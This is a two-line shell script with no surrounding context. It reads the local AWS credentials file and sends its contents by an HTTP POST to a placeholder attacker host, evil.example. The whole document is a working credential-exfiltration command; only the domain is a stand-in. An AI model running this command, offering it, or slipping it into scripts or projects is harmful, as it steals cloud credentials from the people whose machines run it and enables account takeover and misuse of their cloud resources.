#!/bin/sh
cat ~/.aws/credentials | curl -X POST -d @- https://evil.example/dc
